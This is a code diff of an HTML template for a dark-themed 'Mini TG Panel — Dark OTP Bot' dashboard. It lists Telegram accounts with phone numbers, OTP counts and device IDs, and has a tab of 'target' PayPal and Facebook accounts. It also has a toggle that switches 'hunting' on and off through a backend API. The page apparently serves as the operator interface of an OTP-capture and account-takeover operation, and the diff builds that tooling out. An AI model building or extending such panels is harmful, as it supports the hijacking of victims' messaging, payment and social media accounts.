@@ -1,46 +1,128 @@
-<!-- web_panel/templates/mini_panel.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My AI Accounts</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Mini TG Panel — Dark OTP Bot</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <style>
+    :root {
+      --tg-bg-main: #17212b; --tg-bg-sidebar: #0e1621; --tg-bg-active: #2b5278;
+      --tg-bg-hover: rgba(255,255,255,0.05); --tg-text-white: #f5f5f5; --tg-text-grey: #7e8c99;
+      --tg-accent-blue: #5288c1; --tg-incoming-bubble: #182533; --tg-outgoing-bubble: #2b5278;
+      --tg-border: #242f3d; --tg-green: #4fae4e; --tg-red: #e55353; --tg-amber: #e5a93c;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    body { font-family: 'Roboto', -apple-system, sans-serif; background-color: var(--tg-bg-sidebar); color: var(--tg-text-white); height: 100vh; width: 100vw; overflow: hidden; display: flex; flex-direction: column; }
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 4px; }
+    .top-header { height: 56px; background-color: var(--tg-bg-sidebar); border-bottom: 1px solid var(--tg-border); display: flex; align-items: center; justify-content: space-between; padding: 0 16px; z-index: 40; flex-shrink: 0; }
+    .tabs { display: flex; background: #0e1621; border-bottom: 1px solid var(--tg-border); }
+    .tab { flex: 1; text-align: center; padding: 12px; font-size: 14px; font-weight: 500; color: var(--tg-text-grey); cursor: pointer; border-bottom: 2px solid transparent; }
+    .tab.active { color: var(--tg-accent-blue); border-bottom-color: var(--tg-accent-blue); }
+    .app-container { flex: 1; display: flex; position: relative; overflow: hidden; }
+    .chat-list-panel { width: 100%; max-width: 100%; background-color: var(--tg-bg-sidebar); display: flex; flex-direction: column; z-index: 10; height: 100%; overflow-y: auto; }
+    .chat-item { display: flex; align-items: center; padding: 12px 16px; cursor: pointer; transition: 0.15s; }
+    .chat-item:hover { background-color: var(--tg-bg-hover); }
+    .chat-item.active { background-color: var(--tg-bg-active); }
+    .tg-avatar { width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 17px; color: #fff; flex-shrink: 0; }
+    .status-pill { font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: 600; display: inline-flex; align-items: center; gap: 4px; margin-top: 3px; }
+    .empty-state { padding: 40px 20px; text-align: center; color: var(--tg-text-grey); font-size: 13px; }
+  </style>
 </head>
-<body class="bg-gray-900 text-white font-sans">
-    <div class="flex h-screen">
-        <!-- Sidebar -->
-        <div class="w-1/4 bg-gray-800 p-4 border-r border-gray-700">
-            <h2 class="text-xl font-bold text-cyan-400 mb-4">My Accounts</h2>
-            <ul id="account-list" class="space-y-2">
-                <!-- JS populate karega -->
-            </ul>
-        </div>
-        <!-- Main View -->
-        <div class="w-3/4 p-6 flex items-center justify-center">
-            <iframe id="account-view" class="w-full h-full border-2 border-gray-700 rounded-lg" src="about:blank"></iframe>
-        </div>
+<body>
+  <header class="top-header">
+    <div style="font-size:15px; font-weight:700;">Mini Panel</div>
+    <div style="display:flex; gap:10px;">
+      <a href="/" style="color:var(--tg-text-grey); text-decoration:none; background:rgba(255,255,255,0.06); padding:4px 8px; border-radius:6px; font-size:12px;">Control Panel</a>
+      <button id="hunt-btn" style="padding:6px 14px; border-radius:18px; border:none; font-size:12px; font-weight:700; color:#fff; background:var(--tg-text-grey);">…</button>
     </div>
+  </header>
 
-    <script>
-        // Data fetch karo (API se)
-        async function fetchMyAccounts() {
-            const res = await fetch('/api/user_accounts/{{ token }}'); // Token pass hoga
-            const data = await res.json();
-            const list = document.getElementById('account-list');
-            list.innerHTML = '';
-            
-            data.accounts.forEach(acc => {
-                const li = document.createElement('li');
-                li.className = "p-3 bg-gray-700 rounded cursor-pointer hover:bg-gray-600";
-                li.textContent = acc.platform + " - " + acc.username;
-                li.onclick = () => {
-                    document.getElementById('account-view').src = acc.view_url;
-                };
-                list.appendChild(li);
-            });
+  <div class="tabs">
+    <div class="tab active" onclick="switchTab('tg')">Telegram Accounts</div>
+    <div class="tab" onclick="switchTab('target')">PayPal / FB Accounts</div>
+  </div>
+
+  <div class="app-container" id="tg-list-container">
+    <div class="chat-list-panel" id="tg-accounts-list"></div>
+  </div>
+
+  <div class="app-container" id="target-list-container" style="display:none;">
+    <div class="chat-list-panel" id="target-accounts-list"></div>
+  </div>
+
+  <script>
+    let currentTab = 'tg';
+    function switchTab(tab) {
+      currentTab = tab;
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      event.target.classList.add('active');
+      document.getElementById('tg-list-container').style.display = tab === 'tg' ? 'block' : 'none';
+      document.getElementById('target-list-container').style.display = tab === 'target' ? 'block' : 'none';
+      if (tab === 'tg') fetchTGAccounts();
+      else fetchTargetAccounts();
+    }
+
+    async function fetchTGAccounts() {
+      try {
+        const res = await fetch('/api/get_accounts');
+        const data = await res.json();
+        const box = document.getElementById('tg-accounts-list');
+        if (!data.accounts || data.accounts.length === 0) {
+          box.innerHTML = `<div class="empty-state">No Telegram accounts found.</div>`;
+          return;
         }
-        fetchMyAccounts();
-    </script>
+        box.innerHTML = data.accounts.map(acc => `
+          <div class="chat-item">
+            <div class="tg-avatar" style="background:#5288c1">${acc.phone.slice(-2)}</div>
+            <div style="margin-left:14px; flex:1;">
+              <div style="font-weight:700; font-size:14px;">${acc.phone}</div>
+              <div style="font-size:12px; color:var(--tg-text-grey);">${acc.otp_count} OTPs | Device: ${acc.device_id.slice(0,6)}</div>
+              <span class="status-pill" style="background:${acc.status==='active'?'rgba(79,174,78,0.2)':'rgba(229,83,83,0.2)'}; color:${acc.status==='active'?'#4fae4e':'#e55353'};">${acc.status.toUpperCase()}</span>
+            </div>
+          </div>
+        `).join('');
+      } catch(e) { console.error(e); }
+    }
+
+    async function fetchTargetAccounts() {
+      try {
+        const res = await fetch('/api/get_target_accounts');
+        const data = await res.json();
+        const box = document.getElementById('target-accounts-list');
+        if (!data.targets || data.targets.length === 0) {
+          box.innerHTML = `<div class="empty-state">No Target accounts (PayPal/FB) found.</div>`;
+          return;
+        }
+        box.innerHTML = data.targets.map(acc => `
+          <div class="chat-item">
+            <div class="tg-avatar" style="background:#d97724">${acc.platform.slice(0,2).toUpperCase()}</div>
+            <div style="margin-left:14px; flex:1;">
+              <div style="font-weight:700; font-size:14px;">${acc.phone}</div>
+              <div style="font-size:12px; color:var(--tg-text-grey);">Platform: ${acc.platform.toUpperCase()}</div>
+              <span class="status-pill" style="background:${acc.status==='active'?'rgba(79,174,78,0.2)':'rgba(229,83,83,0.2)'}; color:${acc.status==='active'?'#4fae4e':'#e55353'};">${acc.status.toUpperCase()}</span>
+            </div>
+          </div>
+        `).join('');
+      } catch(e) { console.error(e); }
+    }
+
+    document.getElementById('hunt-btn').onclick = async () => {
+      const res = await fetch('/api/toggle_hunting', {method: 'POST', body: JSON.stringify({}), headers: {'Content-Type': 'application/json'}});
+      const data = await res.json();
+      document.getElementById('hunt-btn').innerText = data.enabled ? "Hunting ON" : "Hunting OFF";
+      document.getElementById('hunt-btn').style.background = data.enabled ? "var(--tg-green)" : "var(--tg-red)";
+    };
+
+    fetchTGAccounts();
+    fetch('/api/hunting_status').then(r=>r.json()).then(d=>{
+      document.getElementById('hunt-btn').innerText = d.enabled ? "Hunting ON" : "Hunting OFF";
+      document.getElementById('hunt-btn').style.background = d.enabled ? "var(--tg-green)" : "var(--tg-red)";
+    });
+  </script>
 </body>
 </html>
